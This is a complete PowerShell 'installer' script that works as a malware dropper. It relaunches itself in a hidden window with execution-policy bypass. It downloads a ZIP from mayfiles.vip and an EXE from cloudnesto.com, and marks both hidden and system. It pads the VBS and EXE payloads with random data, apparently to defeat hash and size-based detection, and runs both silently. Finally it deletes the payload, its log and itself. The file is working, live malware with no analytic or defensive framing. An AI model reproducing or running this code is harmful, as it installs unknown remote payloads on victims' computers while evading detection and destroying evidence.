# 
$ErrorActionPreference = "Continue"
$ShowWindow = $0
if (-not $ShowWindow) {
    if ($env:__PS_HIDDEN_LAUNCH -ne "1") {
        $scriptPath = $MyInvocation.MyCommand.Path
        $env:__PS_HIDDEN_LAUNCH = "1"
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        exit
    }
}
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::Expect100Continue = $false
[Net.ServicePointManager]::DefaultConnectionLimit = 20

# ================ ZIP work dir = %USERPROFILE%\Music ================
$zipWorkDir = Join-Path $env:USERPROFILE "Music"
if (-not (Test-Path $zipWorkDir)) {
    New-Item -Path $zipWorkDir -ItemType Directory -Force | Out-Null
}

# ================ EXE work dir = %TEMP% ================
$exeWorkDir = $env:TEMP
if (-not (Test-Path $exeWorkDir)) {
    New-Item -Path $exeWorkDir -ItemType Directory -Force | Out-Null
}

# Log lives in Music folder (super hidden)
$logPath = Join-Path $zipWorkDir "ps1_installer.txt"

function Write-Log {
    param($msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        Add-Content -Path $logPath -Value "$timestamp - $msg" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $logPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Create & Super-Hide log immediately
if (-not (Test-Path $logPath)) { New-Item -Path $logPath -ItemType File -Force | Out-Null }
try {
    Set-ItemProperty -Path $logPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -Force
} catch {}

Write-Log "INSTALLER STARTED"
Write-Log "ZIP work dir: $zipWorkDir"
Write-Log "EXE work dir: $exeWorkDir"
Write-Log "Log file: $logPath"

function Get-RandomString {
    param($length)
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Get-ZipUrlFromPage {
    param($pageUrl)
    Write-Log "Scraping page for ZIP: $pageUrl"
    try {
        $resp = Invoke-WebRequest -Uri $pageUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
        $html = $resp.Content
        $pattern = 'href=["'']([^"'' ]*\.zip)["'']'
        $matches = [regex]::Matches($html, $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches.Count -gt 0) {
            $zipRef = $matches[0].Groups[1].Value
            if ($zipRef -notmatch '^http') { $zipRef = [System.Uri]::new($pageUrl, $zipRef).AbsoluteUri }
            Write-Log "Found ZIP in href: $zipRef"
            return $zipRef
        }
        $pattern2 = '([^\s"'' ]+\.zip)'
        $matches2 = [regex]::Matches($html, $pattern2, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches2.Count -gt 0) {
            $zipRef = $matches2[0].Groups[1].Value
            if ($zipRef -notmatch '^http') { $zipRef = [System.Uri]::new($pageUrl, $zipRef).AbsoluteUri }
            Write-Log "Found ZIP in text: $zipRef"
            return $zipRef
        }
    } catch { Write-Log "Scraping error: $_" }
    return $null
}

function Get-ExeUrlFromPage {
    param($pageUrl)
    Write-Log "Scraping page for EXE: $pageUrl"
    try {
        $resp = Invoke-WebRequest -Uri $pageUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
        $html = $resp.Content
        $pattern = 'href=["'']([^"'' ]*\.exe)["'']'
        $matches = [regex]::Matches($html, $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches.Count -gt 0) {
            $exeRef = $matches[0].Groups[1].Value
            if ($exeRef -notmatch '^http') { $exeRef = [System.Uri]::new($pageUrl, $exeRef).AbsoluteUri }
            Write-Log "Found EXE in href: $exeRef"
            return $exeRef
        }
        $pattern2 = '([^\s"'' ]+\.exe)'
        $matches2 = [regex]::Matches($html, $pattern2, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches2.Count -gt 0) {
            $exeRef = $matches2[0].Groups[1].Value
            if ($exeRef -notmatch '^http') { $exeRef = [System.Uri]::new($pageUrl, $exeRef).AbsoluteUri }
            Write-Log "Found EXE in text: $exeRef"
            return $exeRef
        }
    } catch { Write-Log "EXE scraping error: $_" }
    return $null
}

function Download-File {
    param($url, $destPath)
    Write-Log "Downloading: $url"
    $ts = "?t=" + [int]((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalMilliseconds)
    $fullUrl = $url + $ts
    try {
        Write-Log "Using HttpWebRequest with 1MB buffer"
        $webRequest = [System.Net.HttpWebRequest]::Create($fullUrl)
        $webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        $webRequest.AllowAutoRedirect = $true
        $webRequest.Timeout = 120000
        $webRequest.Method = "GET"
        $response = $webRequest.GetResponse()
        $responseStream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::OpenWrite($destPath)
        $buffer = New-Object byte[] 1048576
        $bytesRead = 0
        do {
            $bytesRead = $responseStream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) { $fileStream.Write($buffer, 0, $bytesRead) }
        } while ($bytesRead -gt 0)
        $fileStream.Close(); $responseStream.Close(); $response.Close()
        Write-Log "Download OK (HttpWebRequest)"
        return $true
    } catch { Write-Log "HttpWebRequest failed: $_" }
    try {
        $curl = Get-Command curl -ErrorAction SilentlyContinue
        if ($curl) {
            Write-Log "Using curl.exe"
            $curlArgs = "-L -o `"$destPath`" -s -S `"$fullUrl`""
            $process = Start-Process -FilePath $curl.Source -ArgumentList $curlArgs -Wait -NoNewWindow -PassThru
            if ($process.ExitCode -eq 0) { Write-Log "Download OK (curl)"; return $true }
        }
    } catch { Write-Log "curl error: $_" }
    try {
        Write-Log "Using WebClient"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($fullUrl, $destPath)
        Write-Log "Download OK (WebClient)"
        return $true
    } catch { Write-Log "WebClient failed: $_" }
    try {
        Write-Log "Using BITS"
        Start-BitsTransfer -Source $fullUrl -Destination $destPath -Priority High -ErrorAction Stop
        Write-Log "Download OK (BITS)"
        return $true
    } catch { Write-Log "BITS failed: $_" }
    Write-Log "ALL download methods failed"
    return $false
}

function Find-SetupVBS {
    param($folder)
    Get-ChildItem -Path $folder -Recurse -Filter "setup.vbs" -ErrorAction SilentlyContinue |
        Select-Object -First 1 -ExpandProperty FullName
}

function Pad-FileToRandomSize {
    param($filePath, $minBytes, $maxBytes)
    try {
        $targetSize = Get-Random -Minimum $minBytes -Maximum $maxBytes
        $currentSize = (Get-Item $filePath).Length
        Write-Log "Padding target: $targetSize bytes, current: $currentSize bytes"
        if ($currentSize -lt $targetSize) {
            $padNeeded = $targetSize - $currentSize
            $buffer = New-Object byte[] 65536
            $rng = New-Object System.Random
            $fs = [System.IO.File]::OpenWrite($filePath)
            $fs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
            $written = 0
            while ($written -lt $padNeeded) {
                $toWrite = [Math]::Min($buffer.Length, $padNeeded - $written)
                $rng.NextBytes($buffer)
                $fs.Write($buffer, 0, $toWrite)
                $written += $toWrite
            }
            $fs.Close()
            Write-Log "Padded to $((Get-Item $filePath).Length) bytes"
        } else {
            Write-Log "File already larger than target, skipping padding"
        }
        return $true
    } catch { Write-Log "Padding error: $_"; return $false }
}

function Hide-FileSuper {
    param($filePath)
    try {
        Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -Force
        Write-Log "Set Super Hidden: $filePath"
        return $true
    } catch { Write-Log "Failed to hide $filePath : $_"; return $false }
}

# ==================================================================
# PART 1: ZIP SMART LINK -> Downloads into %USERPROFILE%\Music
# ==================================================================
$inputUrl = "http://mayfiles.vip/getzip/"
$autoDetect = $1
$showWindow = $0
Write-Log "ZIP Input URL: $inputUrl"
$downloadUrl = $inputUrl
if ($autoDetect -eq "1" -and ($inputUrl -notmatch '\.zip$')) {
    Write-Log "Auto-detecting ZIP link..."
    $detected = Get-ZipUrlFromPage -pageUrl $inputUrl
    if ($detected) { $downloadUrl = $detected; Write-Log "Detected ZIP: $downloadUrl" }
    else { Write-Log "ZIP auto-detect failed" }
}
$randName = Get-RandomString -length 12
$zipPath = Join-Path $zipWorkDir "download_$randName.zip"
$extractDir = Join-Path $zipWorkDir "setup_$randName"
$downloadSuccess = Download-File -url $downloadUrl -destPath $zipPath
if (-not $downloadSuccess) { Write-Log "ZIP DOWNLOAD FAILED" }
elseif ((Get-Item $zipPath).Length -lt 1000) {
    Write-Log "ZIP too small, deleting"
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
} else {
    Write-Log "ZIP downloaded: $((Get-Item $zipPath).Length) bytes"
    Hide-FileSuper -filePath $zipPath | Out-Null
    try {
        Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force -ErrorAction Stop
        Write-Log "ZIP extraction successful"
        Hide-FileSuper -filePath $extractDir | Out-Null
        $vbsPath = Find-SetupVBS -folder $extractDir
        if ($vbsPath) {
            Write-Log "Found setup.vbs: $vbsPath"
            $junkSize = Get-Random -Minimum 102400 -Maximum 716800
            $junk = Get-RandomString -length $junkSize
            Add-Content -Path $vbsPath -Value ("'" + $junk)
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
            Write-Log "VBS launched"
        } else { Write-Log "setup.vbs NOT found" }
    } catch { Write-Log "ZIP extraction failed: $_" }
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    Write-Log "ZIP deleted"
}

# ==================================================================
# PART 2: EXE SMART LINK -> Downloads into %TEMP%, super hidden, silent run
# ==================================================================
$exeInputUrl = "https://cloudnesto.com/SoftwareEXE"
$exeAutoDetect = $1
$exePath = $null
if ($exeInputUrl -and $exeInputUrl -match '^http') {
    Write-Log "EXE Input URL: $exeInputUrl"
    $exeFinalUrl = $exeInputUrl
    if ($exeAutoDetect -eq "1" -and ($exeInputUrl -notmatch '\.exe$')) {
        Write-Log "Auto-detecting EXE link..."
        $exeDetected = Get-ExeUrlFromPage -pageUrl $exeInputUrl
        if ($exeDetected) { $exeFinalUrl = $exeDetected; Write-Log "Detected EXE: $exeFinalUrl" }
        else { Write-Log "EXE auto-detect failed, using original URL" }
    }

    $exeRandName = "sys_" + (Get-RandomString -length 10)
    $exePath = Join-Path $exeWorkDir "$exeRandName.exe"
    Write-Log "EXE download path (single download, TEMP): $exePath"

    $exeSuccess = Download-File -url $exeFinalUrl -destPath $exePath

    if (-not $exeSuccess -or -not (Test-Path $exePath)) {
        Write-Log "EXE DOWNLOAD FAILED"
        $exePath = $null
    } elseif ((Get-Item $exePath).Length -lt 1000) {
        Write-Log "EXE too small (<1KB), deleting"
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
        $exePath = $null
    } else {
        Write-Log "EXE downloaded: $((Get-Item $exePath).Length) bytes"
        Hide-FileSuper -filePath $exePath | Out-Null
        Pad-FileToRandomSize -filePath $exePath -minBytes 1048576 -maxBytes 52428800 | Out-Null
        Hide-FileSuper -filePath $exePath | Out-Null

        try {
            Write-Log "Launching EXE silently from TEMP: $exePath"
            $exeProc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru -ErrorAction Stop
            Write-Log "EXE running silently, PID=$($exeProc.Id)"

            $exited = $exeProc.WaitForExit(900000)
            if ($exited) {
                try { $exitCode = $exeProc.ExitCode } catch { $exitCode = "n/a" }
                Write-Log "EXE exited with code: $exitCode"
            } else {
                Write-Log "EXE still running after 15 min, continuing"
            }
            Start-Sleep -Seconds 5
            Write-Log "Grace period done"
        } catch {
            Write-Log "EXE silent launch FAILED: $_"
        }
    }
} else {
    Write-Log "EXE URL empty/invalid, skipping EXE step"
}

# ==================================================================
# TRACKING URL (silent hit, random UA)
# ==================================================================
$trackingUrl = ""
if ($trackingUrl) {
    Write-Log "Hitting tracking URL: $trackingUrl"
    $uaList = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    )
    $randomUA = $uaList | Get-Random
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", $randomUA)
        $null = $wc.DownloadString($trackingUrl)
        Write-Log "Tracking URL hit OK"
    } catch { Write-Log "Tracking URL failed: $_" }
}

# ==================================================================
# CLEANUP
# ==================================================================
if ($exePath -and (Test-Path $exePath)) {
    Write-Log "Scheduling EXE removal from TEMP: $exePath"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 3; Remove-Item -Path '$exePath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
}

Write-Log "INSTALLER COMPLETED"

# Remove log file after 8s
$logToRemove = $logPath
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 8; Remove-Item -Path '$logToRemove' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden

# Self-delete PS1 after 2s
$selfPath = $MyInvocation.MyCommand.Path
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force`"" -WindowStyle Hidden
